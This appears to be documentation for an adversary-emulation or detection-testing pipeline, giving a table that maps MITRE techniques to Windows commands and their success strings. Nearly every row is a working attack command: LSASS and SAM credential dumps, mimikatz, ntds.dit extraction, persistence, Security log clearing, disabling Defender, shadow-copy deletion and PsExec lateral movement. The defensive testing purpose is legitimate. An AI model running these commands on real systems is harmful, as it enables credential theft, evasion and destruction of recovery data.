# Windows target → MITRE / UKC / output / play_template

Used by `scripts/profiles/windows.py` and consumed by the auto-pipeline.
Each row tells the renderer which tool + arguments to invoke and what
substring the action's stdout should contain to mark `success`.

| target_regex | canonical_path | display_name | tactic | technique | sub_tech | ukc_phase | priv | play_path | play_arguments | expected_output |
|---|---|---|---|---|---|---|---|---|---|---|
| `lsass` | `C:\\Windows\\System32\\lsass.exe` | LSASS Process Memory Dump | TA0006 | T1003 | T1003.001 | Credential Access | yes | `rundll32.exe` | `comsvcs.dll, MiniDump {pid} C:\\Temp\\lsass.dmp full` | `Dump 1 complete` |
| `mimikatz` | `C:\\Tools\\mimikatz.exe` | Mimikatz Credential Dump | TA0006 | T1003 | T1003.001 | Credential Access | yes | `mimikatz.exe` | `privilege::debug sekurlsa::logonpasswords exit` | `Authentication Id` |
| `SAM` | `HKLM\\SAM` | SAM Hive Credential Dump | TA0006 | T1003 | T1003.002 | Credential Access | yes | `reg.exe` | `save HKLM\\SAM C:\\Temp\\SAM.save /y` | `The operation completed successfully` |
| `ntds.dit` | `C:\\Windows\\NTDS\\ntds.dit` | NTDS.dit Credential Extraction | TA0006 | T1003 | T1003.003 | Credential Access | yes | `ntdsutil.exe` | `"ac in ntds" "ifm" "create full C:\\Temp\\ntds" q q` | `IFM media created` |
| `lsadump` | `C:\\Windows\\System32\\lsass.exe` | LSA Secrets Dump via Mimikatz | TA0006 | T1003 | T1003.004 | Credential Access | yes | `mimikatz.exe` | `privilege::debug lsadump::secrets exit` | `Key Content` |
| `CurrentVersion\\Run` | `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` | Registry Run Key Persistence | TA0003 | T1547 | T1547.001 | Persistence | yes | `reg.exe` | `add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /d "C:\\Temp\\updater.exe" /f` | `The operation completed successfully` |
| `schtasks` | `C:\\Windows\\System32\\schtasks.exe` | Scheduled Task Persistence | TA0003 | T1053 | T1053.005 | Persistence | yes | `schtasks.exe` | `/create /tn Updater /tr "C:\\Temp\\updater.exe" /sc minute /mo 5 /f` | `SUCCESS` |
| `services.exe` | `HKLM\\SYSTEM\\CurrentControlSet\\Services` | New Windows Service Persistence | TA0003 | T1543 | T1543.003 | Persistence | yes | `sc.exe` | `create Updater binPath= "C:\\Temp\\updater.exe" start= auto` | `The operation completed successfully` |
| `wevtutil` | `C:\\Windows\\System32\\wevtutil.exe` | Event Log Clearing | TA0005 | T1070 | T1070.001 | Defense Evasion | yes | `wevtutil.exe` | `cl Security` | `was successfully cleared` |
| `powershell` | `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` | PowerShell Encoded Command Execution | TA0002 | T1059 | T1059.001 | Execution | no | `powershell.exe` | `-ExecutionPolicy Bypass -EncodedCommand {b64_payload}` | `Hello` |
| `T1562` | `C:\\Windows\\System32\\sc.exe` | Defence Impairment via Service Disable | TA0005 | T1562 | T1562.001 | Defense Evasion | yes | `sc.exe` | `stop WinDefend` | `SUCCESS` |
| `net.exe` | `C:\\Windows\\System32\\net.exe` | Domain User Enumeration | TA0007 | T1087 | T1087.002 | Discovery | no | `net.exe` | `user /domain` | `User accounts for` |
| `localgroup` | `C:\\Windows\\System32\\net.exe` | Local Administrator Group Enumeration | TA0007 | T1069 | T1069.001 | Discovery | no | `net.exe` | `localgroup administrators` | `Members` |
| `systeminfo` | `C:\\Windows\\System32\\systeminfo.exe` | System Information Discovery | TA0007 | T1082 | — | Discovery | no | `systeminfo.exe` | (empty) | `OS Name` |
| `net view` | `C:\\Windows\\System32\\net.exe` | Network Share Enumeration | TA0007 | T1135 | — | Discovery | no | `net.exe` | `view /domain` | `\\` |
| `tasklist` | `C:\\Windows\\System32\\tasklist.exe` | Process Enumeration | TA0007 | T1057 | — | Discovery | no | `tasklist.exe` | `/v /fo list` | `Image Name` |
| `vssadmin` | `C:\\Windows\\System32\\vssadmin.exe` | Shadow Copy Deletion via vssadmin | TA0040 | T1490 | — | Impact | yes | `vssadmin.exe` | `Delete Shadows /All /Quiet` | `successfully deleted` |
| `shadowcopy` | `C:\\Windows\\System32\\wbem\\wmic.exe` | Shadow Copy Deletion via wmic | TA0040 | T1490 | — | Impact | yes | `wmic` | `shadowcopy delete` | `No Instance` |
| `bcdedit` | `C:\\Windows\\System32\\bcdedit.exe` | Recovery Service Disable | TA0040 | T1490 | — | Impact | yes | `bcdedit.exe` | `/set {default} recoveryenabled no` | `successfully` |
| `psexec` | `C:\\Tools\\psexec.exe` | PsExec Lateral Movement | TA0008 | T1021 | T1021.002 | Lateral Movement | yes | `psexec.exe` | `\\REMOTEHOST -u Administrator -p P@ssw0rd cmd.exe` | `started on` |
| `wmiexec` | `C:\\Tools\\wmiexec.exe` | WMI Lateral Execution | TA0008 | T1021 | T1021.006 | Lateral Movement | yes | `wmiexec.exe` | `Administrator:P@ssw0rd@REMOTEHOST "whoami"` | `command finished` |

## Adding new rows

To add a row, append it to `WINDOWS_TARGET_TABLE` in
`scripts/profiles/windows.py`. Each `TargetRow` needs:

```python
TargetRow(
    target_regex="...",          # what the SPL/Sigma/goal regex looks like
    canonical_path="...",        # human-readable canonical name
    display_name="...",          # YAML title for the action
    tactic="TA000x", technique="Txxxx", sub_technique="Txxxx.NNN" or "",
    ukc_phase="<one of the UKC phases>",
    is_privileged=True/False,
    expected_output="...",       # substring for success_conditions.output
    play_path="...",             # executable to invoke
    play_arguments="...",        # arguments (use {target}, {name}, {pid}, {b64_payload})
    category="Lateral Movement Techniques (Windows)",  # only for lateral
)
```

The renderer substitutes `{target}`, `{name}`, `{pid}`, `{b64_payload}` in
the arguments string. Keep placeholders lowercase to avoid conflicts with
shell variables.
